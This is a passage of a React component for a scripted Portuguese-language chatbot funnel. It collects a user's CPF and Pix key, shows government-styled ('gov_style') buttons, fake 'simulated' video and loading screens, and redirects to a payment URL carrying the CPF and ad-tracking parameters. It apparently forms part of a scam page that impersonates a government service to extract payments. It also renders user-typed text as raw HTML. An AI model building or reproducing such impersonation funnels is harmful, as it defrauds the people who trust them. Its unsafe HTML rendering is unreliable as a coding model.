      for (let i = msgsWithUserReply.length - 2; i >= 0; i--) { // Start from message before user's reply
        if (msgsWithUserReply[i].sender === 'bot' && msgsWithUserReply[i].options && msgsWithUserReply[i].options.length > 0) {
          repliedToBotMessageIndex = i;
          break;
        }
      }

      if (repliedToBotMessageIndex !== -1) {
        const finalMsgs = [...msgsWithUserReply]; // Create a new array for modification
        // Create a new object for the message being modified to ensure state update
        const updatedBotMessage = { ...finalMsgs[repliedToBotMessageIndex], options: undefined };
        finalMsgs[repliedToBotMessageIndex] = updatedBotMessage;
        return finalMsgs;
      }
      return msgsWithUserReply;
    });
    
    setIsBotTyping(true); // Bot starts "typing" for the next step

    // Handle specific actions tied to options
    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = flowVariables.userCPF || "CPF não disponível"; // Use formatted or raw CPF from flowVariables
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    }

    if (option.action === 'redirectToPayment' && option.paymentUrl) {
        let finalPaymentUrl = formatText(option.paymentUrl); // Format URL with variables
        try {
            const url = new URL(finalPaymentUrl);
             // Add UTM and other relevant params from initialParams if not already in paymentUrl
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value as string);
                }
            });
            // Ensure CPF is passed if available
            if (initialParams.cpf && !url.searchParams.has('cpf')) url.searchParams.set('cpf', initialParams.cpf);
            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento." }]);
        }
        setIsBotTyping(false); // Stop typing if redirecting
        return; // Stop further processing
    }

    // Navigate to next step if defined
    if (option.nextStep) {
      handleUserActionAndNavigate(option.nextStep);
    } else if (!option.action) { // If no next step and no action, implies an issue or terminal step
        console.warn("SimulatedChatFlow: Option clicked with no nextStep and no action:", option);
        setIsBotTyping(false); // Stop typing if it's a dead end
    }
  };

  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    if (stepConfig?.type !== 'displayVideo') return;

    handleUserActionAndNavigate(); // Clear video placeholder and related states

    setShowVideoPlaceholderOverlay(false); // Hide overlay (though handleUserActionAndNavigate should clear videoPlaceholderData)
    setIsBotTyping(true); // Bot starts "typing" for the next step

    if (stepConfig.nextStep) {
        handleUserActionAndNavigate(stepConfig.nextStep as string);
    } else {
        setIsBotTyping(false); // No next step after video
    }
  };

  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentTextInputConfig || !textInputValue.trim()) {
        // Show temporary error message if input is empty
        const tempMsgId = `err-input-${Date.now()}`;
        setMessages(prev => [...prev, {id: tempMsgId, sender: 'bot', text: "Por favor, preencha o campo."}]);
        setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000); // Remove after 2s
        return;
    }
    
    handleUserActionAndNavigate(); // Clear text input UI

    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
    
    setIsBotTyping(true); // Bot starts "typing"

    // Update flow variable if specified
    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }
    setTextInputValue(""); // Clear the input field state

    // Navigate to next step
    const nextStepKey = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep)?.nextStep;
    if (nextStepKey) {
        handleUserActionAndNavigate(nextStepKey);
    } else {
        setIsBotTyping(false); // No next step after text input
    }
  };

  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar_gov_style')) {
      // Simple text representation for now, can be replaced with an SVG or image if needed
      return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0, filter: 'grayscale(1) brightness(0.8)'}}>💰</span>;
    }
    // Add more icon mappings here if needed
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {/* Video Placeholder Section - Rendered when videoPlaceholderData is set and bot is not typing/loading */}
      {videoPlaceholderData.current && !isBotTyping && !isLoadingStep && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoMessage && <p className="bot-message" style={{ background: '#e9ecef', color: '#333', borderRadius: '12px', boxShadow: 'none', padding: '10px 15px', marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
          <div
            onClick={handleVideoThumbnailClick}
            className="video-placeholder-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '16/9',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#333', cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center'
            }}
          >
            {showVideoPlaceholderOverlay && ( // Controls visibility of the "Click to Play" overlay
              <div
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px', textAlign: 'center' }}>
                  {formatText(videoPlaceholderData.current?.thumbnailText)}
                </span>
              </div>
            )}
             {/* Placeholder for actual video player or simulated video playing state */}
             { !showVideoPlaceholderOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
          </div>
        </div>
      )}


      {/* Loading Step Section - Rendered when isLoadingStep is true and bot is not typing */}
      {isLoadingStep && loadingMessage && !isBotTyping && (
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
        </div>
      )}

      {/* Dynamic Image Display Section - Rendered when currentImageDetails is set and bot is not typing/loading */}
      {currentImageDetails && !isBotTyping && !isLoadingStep && (
        <div className="message-container bot-message-container image-display-block">
          {/* Removed bot avatar from here */}
          <div className="message bot-message" style={{ padding: '5px' }}> {/* Adjusted padding for image block */}
            {currentImageDetails.message && <p style={{ marginBottom: '8px', padding: '5px 10px', whiteSpace: 'pre-line'}}>{currentImageDetails.message}</p>}
            <Image
              src={currentImageDetails.url}
              alt={currentImageDetails.alt}
              width={300} // Example width, adjust as needed
              height={200} // Example height, adjust as needed
              data-ai-hint={currentImageDetails.aiHint || "illustration"}
              style={{ borderRadius: '8px', maxWidth: '100%', height: 'auto', display: 'block' }}
            />
          </div>
        </div>
      )}


      {/* Display Message Section - Rendered when currentDisplayMessage is set and bot is not typing/loading */}
      {currentDisplayMessage && !isLoadingStep && !isBotTyping && (
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: 'auto', display: 'flex'}}>
           {/* Removed bot avatar from here */}
           <div className="message bot-message" style={{width: 'auto', maxWidth: '100%'}}> {/* Ensure message block takes appropriate width */}
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                {getIconComponent(currentDisplayMessage.displayIcon)}
                <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentDisplayMessage.text}} />}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                      <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                    </React.Fragment>
                  ))}
                </div>
              )}
               {/* Display note if present */}
               { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note) && (
                <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                    <strong>Nota:</strong> {formatText(((funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep).data as FlowStepDataDisplayMessage)?.note)}
                </p>
              )}
           </div>
        </div>
      )}

      {/* Message History - Rendered always */}
      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {/* Removed bot avatar from bot messages here */}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
              {/* Options are only shown if they exist on the message and current step allows interaction (not typing, etc.) */}
              {msg.sender === 'bot' && msg.options &&
               !isBotTyping && !isTextInputActive &&
               !videoPlaceholderData.current && !isLoadingStep &&
               !currentDisplayMessage && !currentImageDetails && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text + (opt.nextStep || '') + (opt.action || '') + (opt.paymentUrl || '')} // More unique key
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`} // Apply dynamic styles if provided
                       dangerouslySetInnerHTML={{__html: opt.text}} // Use formatted text
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {/* Text Input Section - Rendered when isTextInputActive is true and bot is not typing */}
      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input"
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {/* Typing Indicator - Rendered when isBotTyping is true */}
      {isBotTyping && (
         <div className="message-container bot-message-container">
             {/* Removed bot avatar from typing indicator */}
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .simulated-chat-container::-webkit-scrollbar { display: none; }
        .simulated-chat-container { -ms-overflow-style: none; scrollbar-width: none; }

        .message-container {
          display: flex;
          margin-bottom: 12px;
          max-width: 90%; /* Messages don't take full width */
        }
        .bot-message-container {
          align-self: flex-start; /* Bot messages align left */
        }
        .user-message-container {
          align-self: flex-end; /* User messages align right */
          flex-direction: row-reverse; /* Not strictly needed if align-self is used correctly */
        }

        .message {
          padding: 10px 15px;
          border-radius: 18px; /* Rounded corners for messages */
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word; /* Ensure long words break */
          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
          width: auto; /* Message width based on content */
          max-width: 100%; /* Ensure it doesn't overflow its container */
        }
        .bot-message {
          background-color: #e9ecef; /* Light grey for bot messages */
          color: #333;
          border-bottom-left-radius: 4px; /* "Tail" for bot message */
        }
        .user-message {
          background-color: #007bff; /* Blue for user messages */
          color: white;
          border-bottom-right-radius: 4px; /* "Tail" for user message */
          margin-left: auto; /* Pushes user message to the right */
        }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-wrap: wrap; /* Options can wrap to next line */
          align-items: flex-start; /* Align items to the start of the cross axis */
          justify-content: flex-start; /* Align items to the start of the main axis */
          gap: 8px; /* Space between options */
        }
        .chat-option-button {
          background-color: #007bff;
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 25px; /* Pill-shaped buttons */
          cursor: pointer;
          font-size: 15px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .chat-option-button:hover {
          background-color: #0056b3; /* Darker blue on hover */
        }
        /* GovBR Style Buttons (example) */
        .chat-option-button.primary_cta_button_gov_style {
          background-color: #16a34a; /* Green */
          border-color: #16a34a;
          color: white;
          font-weight: bold;
        }
        .chat-option-button.primary_cta_button_gov_style:hover {
          background-color: #15803d; /* Darker Green */
          border-color: #15803d;
        }
        .chat-option-button.secondary_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #007bff; /* Blue link */
          text-decoration: underline;
          padding: 4px 0; /* Minimal padding for link style */
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.secondary_link_button_gov_style:hover {
          color: #0056b3; /* Darker blue on hover */
          background-color: transparent;
        }
         .chat-option-button.destructive_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #dc3545; /* Red link */
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.destructive_link_button_gov_style:hover {
          color: #c82333; /* Darker red on hover */
          background-color: transparent;
        }


        .typing-indicator {
          display: inline-flex; /* Aligns dots horizontally */
          align-items: center;
          padding: 10px 15px; /* Match message padding */
        }
        .typing-indicator .dot {
          width: 8px;
          height: 8px;
          margin: 0 2px; /* Space between dots */
          background-color: #aaa; /* Grey dots */
          border-radius: 50%;
          animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes bounce {
          0%, 80%, 100% { transform: scale(0); }
          40% { transform: scale(1); }
        }
        /* Ensure display message block itself doesn't get overly wide */
        .display-message-block .bot-message {
            width: auto; /* Fit content */
            max-width: 100%; /* Don't exceed parent */
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;

